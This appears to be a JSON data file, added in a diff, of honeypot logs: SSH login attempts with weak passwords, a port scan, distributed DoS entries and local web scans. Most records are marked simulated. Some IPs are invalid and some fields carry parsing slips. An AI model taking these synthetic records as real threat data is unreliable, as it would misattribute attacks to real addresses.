+    "id": "98f53b87-2954-40d4-be54-7a10c3fc5581",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:55:37.453547",
+    "source_ip": "13.123.142.19",
+    "attack_type": "login_attempt",
+    "username": "devraj jhala",
+    "password": "Adm1n@123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-08T01:55:37.453547 [HoneyPotSSHTransport,0,13.123.142.19] login attempt [b'devraj jhala'/b'Adm1n@123'] failed",
+      "login_method": "ssh",
+      "attempts": 7
+    },
+    "attack_hash": "23123e102dd78d38fbd73ad5ef0b3444"
+  },
+  "c737710a-d553-4a38-b6e2-c62c7440eaa6": {
+    "id": "c737710a-d553-4a38-b6e2-c62c7440eaa6",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:55:43.767026",
+    "source_ip": "95.130.119.134",
+    "attack_type": "login_attempt",
+    "username": "ssh",
+    "password": "P@ssw0rd!",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-08T01:55:43.767026 [HoneyPotSSHTransport,0,95.130.119.134] login attempt [b'ssh'/b'P@ssw0rd!'] failed",
+      "login_method": "ssh",
+      "attempts": 10
+    },
+    "attack_hash": "d37b66f0c15dc6846a62e5b781ca62ec"
+  },
+  "bda52860-ae16-4348-91a6-25120aae4e97": {
+    "id": "bda52860-ae16-4348-91a6-25120aae4e97",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-08 01:55:49.459186",
+    "source_ip": "104.25.58.186",
+    "attack_type": "login_attempt",
+    "username": "devraj jhala",
+    "password": "devraj jhala123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-08T01:55:49.459186 [HoneyPotSSHTransport,0,104.25.58.186] login attempt [b'devraj jhala'/b'devraj jhala123'] failed",
+      "login_method": "ssh",
+      "attempts": 4
+    },
+    "attack_hash": "f9c4cd39d95c0f51fc5953e9782f0d1b"
+  },
+  "a8a9cb5e-9369-4785-b3a5-5a5b8079b794": {
+    "id": "a8a9cb5e-9369-4785-b3a5-5a5b8079b794",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-09 16:38:23.490535",
+    "source_ip": "104.91.182.157",
+    "attack_type": "login_attempt",
+    "username": "devraj jhala",
+    "password": "devraj jhala123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-09T16:38:23.490535 [HoneyPotSSHTransport,0,104.91.182.157] login attempt [b'devraj jhala'/b'devraj jhala123'] failed",
+      "login_method": "ssh",
+      "attempts": 4
+    },
+    "attack_hash": "c37fa1a168e9db0c976dc9c69483d894"
+  },
+  "bc8d03cd-aa3d-4a60-8660-bc6f0c6eab61": {
+    "id": "bc8d03cd-aa3d-4a60-8660-bc6f0c6eab61",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-09 16:38:35.553106",
+    "source_ip": "185.135.151.40",
+    "attack_type": "login_attempt",
+    "username": "azureuser",
+    "password": "ssh@3556",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-09T16:38:35.553106 [HoneyPotSSHTransport,0,185.135.151.40] login attempt [b'azureuser'/b'ssh@3556'] failed",
+      "login_method": "ssh",
+      "attempts": 5
+    },
+    "attack_hash": "963bf41cc5141fb5ffea085c4c9c403e"
+  },
+  "e3a0bbbe-407b-43e9-a981-204f643c467d": {
+    "id": "e3a0bbbe-407b-43e9-a981-204f643c467d",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-09 16:38:47.554955",
+    "source_ip": "58.103.63.210",
+    "attack_type": "login_attempt",
+    "username": "tomcat",
+    "password": "P@ssw0rd!",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-09T16:38:47.554955 [HoneyPotSSHTransport,0,58.103.63.210] login attempt [b'tomcat'/b'P@ssw0rd!'] failed",
+      "login_method": "ssh",
+      "attempts": 3
+    },
+    "attack_hash": "13dcf99b4517a2b1599330dd93596be6"
+  },
+  "c3bf9acf-fa36-4be3-9022-913a25818145": {
+    "id": "c3bf9acf-fa36-4be3-9022-913a25818145",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-09 16:38:59.560920",
+    "source_ip": "58.209.241.4",
+    "attack_type": "login_attempt",
+    "username": "ubuntu",
+    "password": "Adm1n@123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-09T16:38:59.560920 [HoneyPotSSHTransport,0,58.209.241.4] login attempt [b'ubuntu'/b'Adm1n@123'] failed",
+      "login_method": "ssh",
+      "attempts": 9
+    },
+    "attack_hash": "f72ded220827e628151b8b127e007b99"
+  },
+  "24c509bf-e9ac-44ed-b1c8-9bb58f092fb2": {
+    "id": "24c509bf-e9ac-44ed-b1c8-9bb58f092fb2",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-09 16:39:11.366008",
+    "source_ip": "104.208.231.31",
+    "attack_type": "login_attempt",
+    "username": "postgres",
+    "password": "devraj jhala123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-09T16:39:11.366008 [HoneyPotSSHTransport,0,104.208.231.31] login attempt [b'postgres'/b'devraj jhala123'] failed",
+      "login_method": "ssh",
+      "attempts": 2
+    },
+    "attack_hash": "fac7951c099f62a64ad74b34214f20a1"
+  },
+  "f268e93d-f86b-4d04-9767-cafc48368b58": {
+    "id": "f268e93d-f86b-4d04-9767-cafc48368b58",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-09 16:39:23.386774",
+    "source_ip": "62.77.173.6",
+    "attack_type": "login_attempt",
+    "username": "ubuntu",
+    "password": "P@ssw0rd!",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-09T16:39:23.386774 [HoneyPotSSHTransport,0,62.77.173.6] login attempt [b'ubuntu'/b'P@ssw0rd!'] failed",
+      "login_method": "ssh",
+      "attempts": 2
+    },
+    "attack_hash": "511c773fbeb23bd58c6762195b73b853"
+  },
+  "68a737d2-8213-4c62-9550-b71a83cb50b0": {
+    "id": "68a737d2-8213-4c62-9550-b71a83cb50b0",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-09 16:39:35.370597",
+    "source_ip": "185.214.236.153",
+    "attack_type": "login_attempt",
+    "username": "azureuser",
+    "password": "Welcome2022!",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-09T16:39:35.370597 [HoneyPotSSHTransport,0,185.214.236.153] login attempt [b'azureuser'/b'Welcome2022!'] failed",
+      "login_method": "ssh",
+      "attempts": 4
+    },
+    "attack_hash": "8e935a6319a16afaf8b527f787cbc5a3"
+  },
+  "169e35ca-03cb-4324-b35e-160544c5c98c": {
+    "id": "169e35ca-03cb-4324-b35e-160544c5c98c",
+    "honeypot_id": "2a84cba6-1e76-422f-92d4-9a1096d64c7b",
+    "timestamp": "2025-04-09 11:11:20",
+    "source_ip": "172.17.0.1]",
+    "attack_type": "login_attempt",
+    "username": "honeypot",
+    "password": "ayush",
+    "details": {
+      "raw_log": "2025-04-09T11:11:20+0000 [HoneyPotSSHTransport,0,172.17.0.1] login attempt [b'honeypot'/b'ayush'] failed"
+    },
+    "attack_hash": "07c24b7d842c882532a9d673584273e5"
+  },
+  "23e8f0ac-892d-4cc6-9809-5a064da607e0": {
+    "id": "23e8f0ac-892d-4cc6-9809-5a064da607e0",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-09 17:08:58.370765",
+    "source_ip": "58.245.4.65",
+    "attack_type": "port_scan",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "scanned_ports": [
+        746,
+        496,
+        257,
+        277,
+        481,
+        613,
+        753,
+        8025,
+        805,
+        8033,
+        10066,
+        197,
+        627,
+        860,
+        1008,
+        254,
+        8048,
+        790,
+        897,
+        10098,
+        118,
+        686,
+        378,
+        1002,
+        247,
+        8092,
+        1003,
+        668,
+        10071,
+        810,
+        737,
+        10073,
+        461,
+        755,
+        727,
+        242,
+        545,
+        532,
+        672,
+        523,
+        973,
+        1023,
+        945,
+        751,
+        623,
+        882,
+        866,
+        213,
+        732,
+        392
+      ],
+      "scan_rate": 10,
+      "scan_type": "XMAS",
+      "raw_log": "2025-04-09T17:08:58.370765 [HoneyPotNetworking,0,58.245.4.65] XMAS scan targeting ports [746, 496, 257, 277, 481]...",
+      "evasion_techniques": [
+        "decoys",
+        "IP_spoofing"
+      ],
+      "scan_pattern": "pattern-based"
+    },
+    "attack_hash": "f349735d2ae76df748454866feb48f48"
+  },
+  "b4a31b3d-282e-4c49-b928-f3ab517d14f2": {
+    "id": "b4a31b3d-282e-4c49-b928-f3ab517d14f2",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-09 17:10:49.917186",
+    "source_ip": "34.204.98.1",
+    "attack_type": "login_attempt",
+    "username": "ubuntu",
+    "password": "devraj jhala123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-09T17:10:49.917186 [HoneyPotSSHTransport,0,34.204.98.1] login attempt [b'ubuntu'/b'devraj jhala123'] failed",
+      "login_method": "ssh",
+      "attempts": 3
+    },
+    "attack_hash": "8ea069f98b8349820079ad3630b15137"
+  },
+  "fcde3d14-e94d-417c-837b-6c7a0516e69b": {
+    "id": "fcde3d14-e94d-417c-837b-6c7a0516e69b",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-09 17:11:01.923849",
+    "source_ip": "13.227.130.183",
+    "attack_type": "login_attempt",
+    "username": "jenkins",
+    "password": "P@ssw0rd!",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-09T17:11:01.923849 [HoneyPotSSHTransport,0,13.227.130.183] login attempt [b'jenkins'/b'P@ssw0rd!'] failed",
+      "login_method": "ssh",
+      "attempts": 8
+    },
+    "attack_hash": "b0330f2bd3bfe9560c666bffafd0288c"
+  },
+  "8690abdc-8232-4d0f-822e-7f6bd78a379f": {
+    "id": "8690abdc-8232-4d0f-822e-7f6bd78a379f",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-09 17:11:13.924722",
+    "source_ip": "172.208.102.196",
+    "attack_type": "dos",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "request_count": 23641,
+      "request_rate": 1698,
+      "target_resource": "/admin/auth",
+      "attack_type": "SSL Exhaustion",
+      "distributed": true,
+      "source_ips": [
+        "163.104.153.46",
+        "161.99.168.231",
+        "120.243.62.14",
+        "194.197.204.38",
+        "134.43.164.83"
+      ],
+      "raw_log": "2025-04-09T17:11:13.924722 [HoneyPotDDoS,0,172.208.102.196] DoS attempt: 23641 requests at 1698/sec to /admin/auth"
+    },
+    "attack_hash": "a9ee13c5f58898694ece157415cce038"
+  },
+  "869d1fb0-c638-4d5a-8830-6752b9003e5d": {
+    "id": "869d1fb0-c638-4d5a-8830-6752b9003e5d",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-09 17:11:25.926212",
+    "source_ip": "95.218.245.65",
+    "attack_type": "dos",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "request_count": 48498,
+      "request_rate": 1364,
+      "target_resource": "/admin/auth",
+      "attack_type": "ReDoS",
+      "distributed": true,
+      "source_ips": [
+        "111.49.100.151",
+        "52.101.88.34",
+        "60.181.10.175",
+        "173.130.98.202",
+        "135.112.185.84",
+        "74.207.111.182",
+        "175.97.109.1",
+        "118.157.236.1",
+        "193.215.176.170"
+      ],
+      "raw_log": "2025-04-09T17:11:25.926212 [HoneyPotDDoS,0,95.218.245.65] DoS attempt: 48498 requests at 1364/sec to /admin/auth"
+    },
+    "attack_hash": "17c6d0aca3e978e6d7e818cbe024cc76"
+  },
+  "6345d529-7750-4175-9507-f8c01238f502": {
+    "id": "6345d529-7750-4175-9507-f8c01238f502",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-09 17:11:37.919611",
+    "source_ip": "45.169.75.120",
+    "attack_type": "dos",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "request_count": 35386,
+      "request_rate": 1841,
+      "target_resource": "/api/v2/user",
+      "attack_type": "HTTP POST Flood",
+      "distributed": true,
+      "source_ips": [
+        "253.124.191.175",
+        "99.48.166.18",
+        "188.41.72.62",
+        "196.144.72.169",
+        "45.28.171.174"
+      ],
+      "raw_log": "2025-04-09T17:11:37.919611 [HoneyPotDDoS,0,45.169.75.120] DoS attempt: 35386 requests at 1841/sec to /api/v2/user"
+    },
+    "attack_hash": "c6c27ab701e718685663b1586ee2080a"
+  },
+  "8166972a-ad1c-4c5f-a0d8-4273464c8c52": {
+    "id": "8166972a-ad1c-4c5f-a0d8-4273464c8c52",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-09 17:11:49.920781",
+    "source_ip": "8.222.122.106",
+    "attack_type": "dos",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "request_count": 28974,
+      "request_rate": 1158,
+      "target_resource": "/api/v2/user",
+      "attack_type": "ReDoS",
+      "distributed": true,
+      "source_ips": [
+        "82.59.100.109",
+        "128.181.166.40",
+        "156.159.158.191",
+        "22.12.159.4",
+        "137.36.47.1",
+        "1.14.51.244",
+        "103.2.143.182",
+        "226.117.134.160"
+      ],
+      "raw_log": "2025-04-09T17:11:49.920781 [HoneyPotDDoS,0,8.222.122.106] DoS attempt: 28974 requests at 1158/sec to /api/v2/user"
+    },
+    "attack_hash": "c6649d2faeac4e128731a1b55ecc5d81"
+  },
+  "9f7f9043-fc98-4bf0-8d50-59a9c83d76d7": {
+    "id": "9f7f9043-fc98-4bf0-8d50-59a9c83d76d7",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-09 17:12:01.934451",
+    "source_ip": "217.72.5.238",
+    "attack_type": "dos",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "request_count": 40639,
+      "request_rate": 544,
+      "target_resource": "/api/v2/user",
+      "attack_type": "Slowloris",
+      "distributed": true,
+      "source_ips": [
+        "83.51.179.20",
+        "4.36.233.77",
+        "211.47.212.67",
+        "114.243.91.113",
+        "29.77.96.210",
+        "126.214.246.96",
+        "52.242.179.157",
+        "231.235.208.54",
+        "214.241.96.77",
+        "71.57.183.29",
+        "200.249.100.85",
+        "218.76.223.81",
+        "21.91.184.211",
+        "104.4.119.125"
+      ],
+      "raw_log": "2025-04-09T17:12:01.934451 [HoneyPotDDoS,0,217.72.5.238] DoS attempt: 40639 requests at 544/sec to /api/v2/user"
+    },
+    "attack_hash": "854210422ecbf353210e8e912f3b8301"
+  },
+  "e93138c8-4fb5-4f80-bef8-bcb527224ded": {
+    "id": "e93138c8-4fb5-4f80-bef8-bcb527224ded",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-09 17:12:13.916551",
+    "source_ip": "172.33.2.213",
+    "attack_type": "login_attempt",
+    "username": "tomcat",
+    "password": "P@ssw0rd!",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-09T17:12:13.916551 [HoneyPotSSHTransport,0,172.33.2.213] login attempt [b'tomcat'/b'P@ssw0rd!'] failed",
+      "login_method": "ssh",
+      "attempts": 7
+    },
+    "attack_hash": "20584916f92e05f28e55e687becc8e73"
+  },
+  "3c78e5ab-c49d-4f59-9cb9-46c40981c795": {
+    "id": "3c78e5ab-c49d-4f59-9cb9-46c40981c795",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-09 17:12:25.918856",
+    "source_ip": "95.104.105.218",
+    "attack_type": "dos",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "request_count": 22445,
+      "request_rate": 507,
+      "target_resource": "/admin/auth",
+      "attack_type": "HTTP POST Flood",
+      "distributed": true,
+      "source_ips": [
+        "185.37.193.58",
+        "13.36.206.77",
+        "90.168.79.79",
+        "35.123.120.165",
+        "93.138.82.114"
+      ],
+      "raw_log": "2025-04-09T17:12:25.918856 [HoneyPotDDoS,0,95.104.105.218] DoS attempt: 22445 requests at 507/sec to /admin/auth"
+    },
+    "attack_hash": "40ce45df848c2b02450da9be26cf9985"
+  },
+  "d144dec1-f845-4a1e-8fed-57df7bd75f7f": {
+    "id": "d144dec1-f845-4a1e-8fed-57df7bd75f7f",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-09 17:12:37.932522",
+    "source_ip": "176.141.217.72",
+    "attack_type": "dos",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "request_count": 29536,
+      "request_rate": 1139,
+      "target_resource": "/admin/auth",
+      "attack_type": "Slowloris",
+      "distributed": true,
+      "source_ips": [
+        "125.14.52.84",
+        "184.205.187.168",
+        "136.175.104.185",
+        "139.242.128.187",
+        "23.95.16.89",
+        "21.93.77.178",
+        "215.138.154.254",
+        "134.85.57.110",
+        "95.166.37.56",
+        "31.160.77.14",
+        "254.233.234.12",
+        "113.156.205.82",
+        "194.2.212.93",
+        "32.6.236.125",
+        "83.132.38.74",
+        "10.147.6.126",
+        "206.158.21.23",
+        "162.188.207.78"
+      ],
+      "raw_log": "2025-04-09T17:12:37.932522 [HoneyPotDDoS,0,176.141.217.72] DoS attempt: 29536 requests at 1139/sec to /admin/auth"
+    },
+    "attack_hash": "bee6cf1c150f81fde892d98352e4c01f"
+  },
+  "22a8d812-f11a-44ac-b831-f96513da39d3": {
+    "id": "22a8d812-f11a-44ac-b831-f96513da39d3",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-13 10:30:08",
+    "source_ip": "172.17.0.1]",
+    "attack_type": "login_attempt",
+    "username": "honeypot",
+    "password": "govinda",
+    "details": {
+      "raw_log": "2025-04-13T10:30:08+0000 [HoneyPotSSHTransport,0,172.17.0.1] login attempt [b'honeypot'/b'govinda'] failed"
+    },
+    "attack_hash": "97df00635d093269c026c6328a24155f"
+  },
+  "931013c1-6928-4ff5-8342-15368d229dc5": {
+    "id": "931013c1-6928-4ff5-8342-15368d229dc5",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-13 10:30:12",
+    "source_ip": "172.17.0.1]",
+    "attack_type": "login_attempt",
+    "username": "honeypot",
+    "password": "devraj\\\\",
+    "details": {
+      "raw_log": "2025-04-13T10:30:12+0000 [HoneyPotSSHTransport,0,172.17.0.1] login attempt [b'honeypot'/b'devraj\\\\'] failed"
+    },
+    "attack_hash": "989b2c9894b0242824603deadd3dbef7"
+  },
+  "79da6fd0-6da6-4ba3-8f62-5be54a413997": {
+    "id": "79da6fd0-6da6-4ba3-8f62-5be54a413997",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-13 10:30:16",
+    "source_ip": "172.17.0.1]",
+    "attack_type": "login_attempt",
+    "username": "honeypot",
+    "password": "dhgdhd",
+    "details": {
+      "raw_log": "2025-04-13T10:30:16+0000 [HoneyPotSSHTransport,0,172.17.0.1] login attempt [b'honeypot'/b'dhgdhd'] failed"
+    },
+    "attack_hash": "2a047263d978d528816b16b353cf12bf"
+  },
+  "603fb5be-7297-4da5-8909-04e3fe2c7fcc": {
+    "id": "603fb5be-7297-4da5-8909-04e3fe2c7fcc",
+    "honeypot_id": "2ac13d84-c02b-4c2c-b66b-3605307c0924",
+    "timestamp": "2025-04-13 16:41:04.363273",
+    "source_ip": "172.17.0.1",
+    "attack_type": "web_scan",
+    "username": null,
+    "password": null,
+    "details": {
+      "method": "GET",
+      "path": "/login.php",
+      "raw_log": "172.17.0.1 - - [13/Apr/2025:11:10:47 +0000] \"GET /login.php HTTP/1.1\" 200 1048 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36\""
+    },
+    "attack_hash": "9a138e8a73bac4d05f82864805f27efb"
+  },
+  "cc455f3b-b12c-41ff-b307-203b12453218": {
+    "id": "cc455f3b-b12c-41ff-b307-203b12453218",
+    "honeypot_id": "2ac13d84-c02b-4c2c-b66b-3605307c0924",
+    "timestamp": "2025-04-13 16:41:04.363273",
+    "source_ip": "172.17.0.1",
+    "attack_type": "web_scan",
+    "username": null,
+    "password": null,
+    "details": {
+      "method": "POST",
+      "path": "/login.php",
+      "raw_log": "172.17.0.1 - - [13/Apr/2025:11:10:54 +0000] \"POST /login.php HTTP/1.1\" 302 337 \"http://localhost:54405/login.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36\""
+    },
+    "attack_hash": "398290e8e219af1768c467a30ac2e570"
+  },
+  "4c6a778b-c43d-401f-a1fd-dbfd6a460e3d": {
+    "id": "4c6a778b-c43d-401f-a1fd-dbfd6a460e3d",
+    "honeypot_id": "2ac13d84-c02b-4c2c-b66b-3605307c0924",
+    "timestamp": "2025-04-13 16:41:04.363273",
+    "source_ip": "172.17.0.1",
+    "attack_type": "web_scan",
+    "username": null,
+    "password": null,
+    "details": {
+      "method": "GET",
+      "path": "/setup.php",
+      "raw_log": "172.17.0.1 - - [13/Apr/2025:11:10:54 +0000] \"GET /setup.php HTTP/1.1\" 200 2042 \"http://localhost:54405/login.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36\""
+    },
+    "attack_hash": "e7f6c0a57d57be79058070e2a0c02416"
+  },
+  "900da9c8-876a-4844-9b69-f556c6faf092": {
+    "id": "900da9c8-876a-4844-9b69-f556c6faf092",
+    "honeypot_id": "2ac13d84-c02b-4c2c-b66b-3605307c0924",
+    "timestamp": "2025-04-13 16:44:06.627342",
+    "source_ip": "172.17.0.1",
+    "attack_type": "web_scan",
+    "username": null,
+    "password": null,
+    "details": {
+      "method": "GET",
+      "path": "/login.php",
+      "raw_log": "172.17.0.1 - - [13/Apr/2025:11:13:46 +0000] \"GET /login.php HTTP/1.1\" 200 1049 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36\""
+    },
+    "attack_hash": "80a9b1736f3e4a078252b57c98823f5f"
+  },
+  "0a07b204-70ec-4301-8c93-90ab25bfab0b": {
+    "id": "0a07b204-70ec-4301-8c93-90ab25bfab0b",
+    "honeypot_id": "2ac13d84-c02b-4c2c-b66b-3605307c0924",
+    "timestamp": "2025-04-13 16:44:06.627342",
+    "source_ip": "172.17.0.1",
+    "attack_type": "web_scan",
+    "username": null,
+    "password": null,
+    "details": {
+      "method": "POST",
+      "path": "/login.php",
+      "raw_log": "172.17.0.1 - - [13/Apr/2025:11:14:02 +0000] \"POST /login.php HTTP/1.1\" 302 337 \"http://localhost:54405/login.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36\""
+    },
+    "attack_hash": "0ed0aa47b4778f9855c14e1ab24cc93c"
+  },
+  "19cbd589-1508-4a38-bb0a-ce5f42c68297": {
+    "id": "19cbd589-1508-4a38-bb0a-ce5f42c68297",
+    "honeypot_id": "2ac13d84-c02b-4c2c-b66b-3605307c0924",
+    "timestamp": "2025-04-13 16:44:06.627342",
+    "source_ip": "172.17.0.1",
+    "attack_type": "web_scan",
+    "username": null,
+    "password": null,
+    "details": {
+      "method": "GET",
+      "path": "/setup.php",
+      "raw_log": "172.17.0.1 - - [13/Apr/2025:11:14:02 +0000] \"GET /setup.php HTTP/1.1\" 200 2041 \"http://localhost:54405/login.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36\""
+    },
+    "attack_hash": "ffa7c3db6962e8cbba4db9b94f0a558a"
+  },
+  "7cc51d59-85d8-4144-a155-0ba12e6bddd7": {
+    "id": "7cc51d59-85d8-4144-a155-0ba12e6bddd7",
+    "honeypot_id": "2ac13d84-c02b-4c2c-b66b-3605307c0924",
+    "timestamp": "2025-04-13 16:44:37.058623",
+    "source_ip": "172.17.0.1",
+    "attack_type": "web_scan",
+    "username": null,
+    "password": null,
+    "details": {
+      "method": "POST",
+      "path": "/setup.php",
+      "raw_log": "172.17.0.1 - - [13/Apr/2025:11:14:09 +0000] \"POST /setup.php HTTP/1.1\" 302 338 \"http://localhost:54405/setup.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36\""
+    },
+    "attack_hash": "c38bed15ef31b36060d5681505adbbbe"
+  },
+  "0954a8e7-9538-4ab3-81f4-60a9e07b2498": {
+    "id": "0954a8e7-9538-4ab3-81f4-60a9e07b2498",
+    "honeypot_id": "2ac13d84-c02b-4c2c-b66b-3605307c0924",
+    "timestamp": "2025-04-13 16:44:37.058623",
+    "source_ip": "172.17.0.1",
+    "attack_type": "web_scan",
+    "username": null,
+    "password": null,
+    "details": {
+      "method": "GET",
+      "path": "/setup.php",
+      "raw_log": "172.17.0.1 - - [13/Apr/2025:11:14:09 +0000] \"GET /setup.php HTTP/1.1\" 200 2177 \"http://localhost:54405/setup.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36\""
+    },
+    "attack_hash": "5a568689ec0eaf1eeaf8362551c5ad77"
+  },
+  "82deebbe-c969-4956-b0e2-affdd2bb5cdd": {
+    "id": "82deebbe-c969-4956-b0e2-affdd2bb5cdd",
+    "honeypot_id": "2ac13d84-c02b-4c2c-b66b-3605307c0924",
+    "timestamp": "2025-04-13 16:44:37.058623",
+    "source_ip": "172.17.0.1",
+    "attack_type": "web_scan",
+    "username": null,
+    "password": null,
+    "details": {
+      "method": "GET",
+      "path": "/login.php",
+      "raw_log": "172.17.0.1 - - [13/Apr/2025:11:14:14 +0000] \"GET /login.php HTTP/1.1\" 200 1048 \"http://localhost:54405/setup.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36\""
+    },
+    "attack_hash": "90e066c8fa272f5bdcd21159cc016cf1"
+  },
+  "5d6c2a72-3e2f-4589-a889-b46011f5c140": {
+    "id": "5d6c2a72-3e2f-4589-a889-b46011f5c140",
+    "honeypot_id": "2ac13d84-c02b-4c2c-b66b-3605307c0924",
+    "timestamp": "2025-04-13 16:44:37.058623",
+    "source_ip": "172.17.0.1",
+    "attack_type": "web_scan",
+    "username": null,
+    "password": null,
+    "details": {
+      "method": "POST",
+      "path": "/login.php",
+      "raw_log": "172.17.0.1 - - [13/Apr/2025:11:14:20 +0000] \"POST /login.php HTTP/1.1\" 302 337 \"http://localhost:54405/login.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36\""
+    },
+    "attack_hash": "2f990c9905173d884243afa8dbeaca44"
+  },
+  "70834eb4-fbad-4b24-bddc-26b99575ed2c": {
+    "id": "70834eb4-fbad-4b24-bddc-26b99575ed2c",
+    "honeypot_id": "2ac13d84-c02b-4c2c-b66b-3605307c0924",
+    "timestamp": "2025-04-13 16:44:37.058623",
+    "source_ip": "172.17.0.1",
+    "attack_type": "web_scan",
+    "username": null,
+    "password": null,
+    "details": {
+      "method": "GET",
+      "path": "/login.php",
+      "raw_log": "172.17.0.1 - - [13/Apr/2025:11:14:20 +0000] \"GET /login.php HTTP/1.1\" 200 1066 \"http://localhost:54405/login.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36\""
+    },
+    "attack_hash": "ec8c22b2d672fd4bf80cffd8f720fe03"
+  },
+  "3eaa6966-dd1c-4fe0-b7da-92a935baad22": {
+    "id": "3eaa6966-dd1c-4fe0-b7da-92a935baad22",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-14 10:43:02.739530",
+    "source_ip": "95.161.140.16",
+    "attack_type": "login_attempt",
+    "username": "ubuntu",
+    "password": "Welcome2022!",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
